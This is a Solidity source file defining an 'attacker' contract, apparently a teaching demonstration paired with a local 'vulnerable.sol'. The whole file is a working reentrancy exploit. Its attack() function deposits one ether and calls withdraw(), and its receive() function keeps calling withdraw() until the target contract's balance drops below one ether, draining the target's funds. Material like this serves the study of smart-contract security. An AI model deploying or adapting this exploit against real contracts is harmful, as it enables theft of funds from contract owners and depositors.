// SPDX-License-Identifier: MIT

/*
 * This Smart contract will attack the vulnerable Smart contract
 * It will deposit one Ether first then will withdraw all funds
 */

pragma solidity >=0.7.0 <0.9.0;
import "./vulnerable.sol";

contract attacker {

    /*
    * Instance of the vulnerable contract
    */
    vulnerable private store;

    /*
    * @dev constructor will set the instance of vulnerable contract
    * @ param _vulnerable will be the address of vulnerable contract
    * 
    */
    constructor(address _vulnerable) {
        store = vulnerable(_vulnerable);
    }

    /*
    * @dev receive function will receive the funds from vulnerable
    *
    * Requirements:
    * balance of vulnerable contract should be greater than or equal to 1 Ether
    */
    receive() external payable {
        if (address(store).balance >= 1 ether) {
            store.withdraw();
        }
    }

    /*
    * @dev attack function will initiate a reentrancy attack
    *
    * Requirements:
    * Value with call should be greater than or equal to 1 Ether
    */
    function attack() external payable {
        require(msg.value >= 1 ether);
        store.deposit{value: 1 ether}();
        store.withdraw();
    }

    /**
    * @dev getBalance will return the balance of this contract
    */
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
    
}
